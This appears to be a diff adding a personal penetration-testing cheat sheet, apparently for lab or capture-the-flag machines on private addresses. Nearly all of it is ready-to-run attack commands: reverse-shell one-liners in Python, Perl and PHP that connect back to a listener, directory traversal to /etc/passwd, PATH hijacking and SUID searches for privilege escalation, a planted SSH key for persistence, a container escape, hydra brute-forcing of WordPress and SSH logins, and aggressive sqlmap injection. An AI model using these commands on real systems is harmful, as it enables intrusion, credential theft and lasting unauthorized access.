@@ -1,0 +1,69 @@
+web
+	jwt (base64 doubled encoded)
+	check http://192.168.1.27/info.php
+	directory traversal wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/passwd
+	poisoning logs https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1
+find
+	find / -exec cat {} \; grep flag
+
+nmap (-sN null flag syn, -sO lower level networking port scan, -A aggressive, -sS standard)
+	sudo nmap -sn 192.168.1.0/24		(scan for hosts, first 24 bits set)
+	sudo nmap -sS -sV -A 192.168.2.104
+
+dirbusting
+	dirb http://192.168.2.104:80 /usr/share/wordlists/dirb/common.txt
+	wfuzz -w wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ
+	wfuzz --hc 404 -R 3 -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.1.27:80/FUZZ
+
+nc (reverse shell receiver)
+	nc -nlvp 4444 
+
+reverse shells
+	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.102",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+	perl -e 'use Socket;$i="192.168.1.23";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+	$sock=fsockopen("192.168.2.102",4444);exec("/bin/sh -i <&3 >&3 2>&3");
+
+privesc
+	python -c 'import pty;pty.spawn("/bin/bash")'
+	python3 -c 'import pty;pty.spawn("/bin/bash")'
+	ps aux | grep root
+	find / -perm -u=s type f 2>/dev/null		(suid bit file search)
+	if programs call other programs, change $PATH to redirect them to your malicious versions!
+	mysql:x:0:0:MySQL Server,,,:/nonexistent:/bin/false <----- ROOT USER GROUP ID / USER ID 0
+
+linux OS
+	lsb_release -a
+	uname -a
+	echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCqWif+lFSqeO8C/FPp8Rchnc/FniJVTgYzzedThvyM/rmqSjUK1vbaYnK+gYIUAEbE6HMys5rz7exPZYwfcI39kyEmcSJp9uzbsljLFncbv/i7nmYVWOnnH44kNMojtmqeTaZtmouTb6CARe8ZkpwHNLDq8ACM3bSNq7dDYCgqvKs6xZhkitDOHBYraDAtJgAKYShE1LCsB4HIQyyowG5jQLl54QxBzcLH7ckbO6cR+VxH8idyeyA7lNCKqoYKHShTyCbFnWbv7lqta1dUsoo70I/4voXPYRndUGIwx9v84AzjxM2P1gVp5m7GljSGJWQzEgNmgbNclzWoHflGswXjgziG1t2zLXAuBorPsm9xcA+S06J/U7rCToqGJmcnfQox9n9+AH5dlVespwE4QfjIWN2MCfw9aRoTUzaQEa8u/VqkkQgEF09za3ucT1/sNLEcMqbq4SToXlENFaTV/JPOSFuiwYuwtfAGTmlVDzqF2DZH0EXJvtEFwRO6zLxWzmM= kali@kali" > .ssh/authorized_keys
+
+file transfer
+	ftp> mget *
+	wget http://192.168.1.23:2000/proxy_server.py
+	python3 -m http.server
+	scp -r ./* kali@192.168.2.102:/home/kali/Sundown/wordpress
+
+kernel-exploits
+	https://www.exploit-db.com/exploits/47163 4.1 through 5.1.17
+
+container escape
+	check for container echo 1 > /proc/sysrq-trigger
+	make a new drive and point it to host
+	mknod xvda1 b 202 1
+	mount xvda1 /mnt
+
+password cracking
+	hydra -l admin -P /usr/share/wordlists/metasploit/password.lst http-post://192.168.2.105/wp-login.php
+	hydra -l admin -P 10k.txt 192.168.2.105 http-post-form "/wp-login.php:log=admin&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.2.105%2Fwp-admin%2F&testcookie=1:Log In"
+	hydra -l carlos -P 10k.txt 192.168.2.105 -t 4 ssh  
+ 
+codebreaking
+	hashing sha256, md5
+
+database injection
+	sqlmap Sundown/post_comment.txt --batch --level=5 --risk=3
+	/usr/lib/x86_64-linux-gnu/mariadb19/plugin/
+	show databases; use mydatabase;
+
+wordpress
+	view-source:http://192.168.2.105/wp-content/plugins/
+	view-source:http://192.168.2.105/wp-config.php
